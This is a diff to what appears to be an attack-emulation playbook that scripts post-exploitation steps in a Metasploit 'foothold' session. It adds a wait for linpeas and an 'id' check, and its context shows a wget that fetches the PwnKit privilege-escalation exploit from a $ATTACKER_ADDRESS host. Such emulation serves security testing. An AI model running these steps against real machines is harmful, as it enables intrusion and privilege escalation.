@@ -136,6 +136,22 @@ commands:
       tactics: "Discovery"
       technique_name: "Account Discovery,File and Directory Discovery,Password Policy Discover,Permission Groups Discovery,Process Discovery,Software Discovery,System Information Discovery,System Location Discovery,System Network Configuration Discovery,System Network Connections Discovery,System Owner/User Discovery,System Service Discovery,Group Policy Discovery"
 
+  # wait a little bit for linpeas
+  - type: sleep
+    seconds: 380
+
+  # This command fixes the outputbuffer
+  # so that the output of the further
+  # commands will work!
+  - type: msf-session
+    read: True
+    cmd: id
+    session: "foothold"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
+      technique_name: "System Owner/User Discovery"
+
   - type: msf-session
     cmd: wget http://$ATTACKER_ADDRESS/PwnKit > /dev/null 2>&1
     session: "foothold"
